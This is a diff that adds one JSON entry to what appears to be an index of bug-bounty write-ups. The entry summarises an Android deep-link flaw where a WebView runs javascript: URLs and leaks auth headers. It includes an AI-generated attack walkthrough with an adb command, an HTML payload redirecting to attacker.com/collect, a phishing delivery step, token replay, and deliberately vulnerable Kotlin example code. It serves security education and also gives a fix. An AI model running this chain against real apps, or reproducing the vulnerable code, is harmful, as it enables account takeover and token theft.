@@ -42,6 +42,46 @@
     "score": 53
   },
   {
+    "id": "9df8c32cb1e0",
+    "title": "One Deep Link, Zero Validation, Full ATO (Again)",
+    "url": "https://abdelnasserr.medium.com/one-deep-link-zero-validation-full-ato-again-294e21e2389b",
+    "source": {
+      "slug": "medium-tag-writeup",
+      "name": "Medium — #bug-bounty-writeup"
+    },
+    "authors": [
+      "abdelnasser"
+    ],
+    "program": null,
+    "platform_slug": "self-disclosed",
+    "bounty_raw": null,
+    "published_at": "2026-11-04T15:06:46.000Z",
+    "added_at": "2026-11-05T10:17:43.439Z",
+    "categories": [
+      "auth-bypass"
+    ],
+    "severity": "critical",
+    "difficulty": "intermediate",
+    "summary_en": "A deep‑link in the Android app loads any URL without validation, allowing a malicious `javascript:` scheme to run in a WebView that re‑issues requests with the user’s authentication headers, resulting in full account takeover.",
+    "summary_ar": null,
+    "lesson": {
+      "cause": "The app registers a custom scheme handler that directly passes the `url` query parameter to a WebView with JavaScript enabled and no scheme validation. The WebViewClient’s `shouldInterceptRequest` re‑issues every main‑frame GET request through OkHttp, automatically adding the logged‑in user’s authentication headers. Because there is no whitelist, any URL – including `javascript:` URLs that redirect to an attacker‑controlled domain – is accepted. The combination of unchecked scheme and blind header injection creates a path for an attacker to steal the victim’s auth cookies or tokens. This design flaw exists in the deep‑link routing code, the WebView settings, and the request‑interception logic.",
+      "walkthrough": "RECON\nStep 1: Identify the deep‑link format used by the app.\n- Action: Look at the Android manifest or observe intent handling.\n- Payload: `redacted-scheme://webview?url=<URL>`\n- Why: The manifest declares a scheme (`redacted-scheme`) that forwards the `url` query to a WebView. (deep‑link = a URL that opens a specific part of an app)\n\nStep 2: Verify that the WebView loads the supplied URL.\n- Action: Launch the intent via ADB.\n- Payload: `adb shell am start -a android.intent.action.VIEW -d 'redacted-scheme://webview?url=javascript:alert(1337)'`\n- Why: The `adb` command tells Android to open the deep‑link; the `javascript:` scheme triggers code execution inside the WebView. (ADB = Android Debug Bridge, a tool to send commands to a device)\n\nSTEP 3: Review the WebView configuration in code.\n- Action: Decompile the APK and read the fragment.\n- Payload: `settings.setJavaScriptEnabled(true); settings.setDomStorageEnabled(true); webView.loadUrl(url, headers);`\n- Why: Enabling JavaScript allows `javascript:` URLs to run; the `loadUrl` call uses the attacker‑controlled `url` without checks. (JavaScript = scripting language that runs in browsers/WebViews)\n\nSTEP 4: Examine the request‑interception logic.\n- Action: Look at `AuthenticatedWebViewClient.shouldInterceptRequest`.\n- Payload: ```\nshouldInterceptRequest(webView, request):\n - if not main frame → skip\n - if URL starts with \"data:\" → skip\n - if method is POST → skip\n - otherwise → re‑issue via OkHttp (adds auth headers)\n - NO DOMAIN WHITELIST\n```\n- Why: Every main‑frame GET is sent again with the app’s auth headers, regardless of destination. (OkHttp = HTTP client library, auth headers = tokens that prove the user is logged in)\n\nEXPLOITATION\nStep 5: Craft a malicious JavaScript payload that redirects to attacker.\n- Action: Write a page that, when loaded, launches the deep‑link with a `javascript:` URL.\n- Payload: ```html\n<script>\n window.location.href = \"redacted-scheme://webview?url=\" + \"javascript:location.href='https://attacker.com/collect'\";\n</script>\n```\n- Why: The script builds a deep‑link whose `url` parameter is a `javascript:` URL; when the app opens it, the JavaScript runs and changes the WebView location to the attacker’s domain. (location.href = current page address)\n\nStep 6: Deliver the malicious page to the victim (e.g., via phishing email or malicious ad).\n- Action: Host the HTML on any web server and lure the user to visit it.\n- Payload: URL of the hosted page (e.g., `https://evil.example/payload.html`).\n- Why: When the victim’s browser loads the page, the script automatically opens the deep‑link in the installed app.\n\nIMPACT\nStep 7: Observe the request that the WebView makes after redirection.\n- Action: Capture network traffic on the device or server.\n- Payload: GET request to `https://attacker.com/collect` with Authorization header.\n- Why: The `shouldInterceptRequest` re‑issues the GET through OkHttp, attaching the user’s auth token, which the attacker receives. (Authorization header = bearer token or cookie proving identity)\n\nStep 8: Use the stolen token to impersonate the victim.\n- Action: Replay the Authorization header against the retailer’s API.\n- Payload: `Authorization: Bearer <stolen_token>`\n- Why: With a valid token the attacker can act as the victim, achieving full account takeover.",
+      "example": "**Fictional vulnerable app (target.example)**\n\nVulnerable code (Kotlin‑like pseudocode):\n```kotlin\nclass DeepLinkActivity : Activity() {\n    override fun onCreate(savedInstanceState: Bundle?) {\n        super.onCreate(savedInstanceState)\n        val url = intent.data?.getQueryParameter(\"url\") ?: return\n        val webView = WebView(this)\n        webView.settings.javaScriptEnabled = true\n        webView.loadUrl(url) // no validation!\n    }\n}\n\nclass AuthWebViewClient : WebViewClient() {\n    override fun shouldInterceptRequest(view: WebView, request: WebResourceRequest): WebResourceResponse? {\n        // Re‑issue request with auth header for every GET\n        val newRequest = Request.Builder()\n            .url(request.url.toString())\n            .addHeader(\"Authorization\", userToken)\n            .build()\n        return okHttpClient.newCall(newRequest).execute().toWebResourceResponse()\n    }\n}\n```\n\nAttack request:\n```\nIntent URI: myapp://open?url=javascript:location.href='https://attacker.example/steal'\n```\nWhen the victim clicks a link that opens the app, the `javascript:` URL runs, redirects the WebView to `https://attacker.example/steal`, and the `shouldInterceptRequest` adds the `Authorization` header. The attacker receives the header and can impersonate the user.",
+      "takeaway": "Hunters should look for custom scheme deep‑links that forward a URL into a WebView. The red flag is `loadUrl` (or similar) called with a parameter that comes directly from the intent without scheme checks. Tools like jadx or apktool help locate such handlers, and grepping for `setJavaScriptEnabled(true)` combined with `shouldInterceptRequest` often reveals the pattern. Variants include loading `file://` or `data:` URLs that can also execute code, or interceptors that inject cookies into arbitrary domains. A common beginner mistake is to assume that enabling JavaScript alone is safe; always verify the destination scheme and enforce a domain whitelist before adding authentication headers.",
+      "fix": "Add strict validation of the `url` parameter before loading it in the WebView. For example, allow only `https://` URLs that match a whitelist of trusted domains and reject any `javascript:` or other schemes. Update the `shouldInterceptRequest` implementation to add authentication headers only when the request’s host is in the whitelist. Pseudocode fix:\n```java\nif (!url.startsWith(\"https://\")) return; // reject non‑HTTPS\nif (!isTrustedDomain(url)) return; // whitelist check\n// only then re‑issue with auth headers\n```\nAlso consider disabling JavaScript for untrusted content or using `loadDataWithBaseURL` with a sandboxed origin. These changes prevent arbitrary code execution and stop auth header leakage.",
+      "cause_ar": null,
+      "walkthrough_ar": null,
+      "example_ar": null,
+      "takeaway_ar": null,
+      "fix_ar": null
+    },
+    "excerpt": "**بِسْمِ اَللَّهِ وَالْحَمْدِ لِلَّهِ الَّذِي عَلَّمَ بِالْقَلَمِ عَلَّمَ الْإِنْسَانَ مَا لَمْ يَعْلَمْ وَالصَّلَاةَ وَالسَّلَامَ عَلَى خَيْرِ مُعَلِّمِي اَلنَّاسِ اَلْخَيْرِ مُحَمَّدْ وَبَعْدٍ** ## Description This is one of the easiest bugs I keep finding across multiple apps. The Android app of a major European electronics retailer has a deep link that opens a WebView: `redacted-scheme://webview?url=<URL>`. JavaScript is enabled, and there is zero scheme validation on the `url` parameter. You can pass `javascript:` as the scheme and the WebView executes it. The real problem is the `shouldI",
+    "ai_generated": true,
+    "engagement": null,
+    "score": 60
+  },
+  {
     "id": "09d712ce68e0",
     "title": "Intent Redirection to One-Click Account Takeover (But It’s a Duplicate)",
     "url": "https://abdelnasserr.medium.com/intent-redirection-to-one-click-account-takeover-but-its-a-duplicate-275f5a0aefaf",
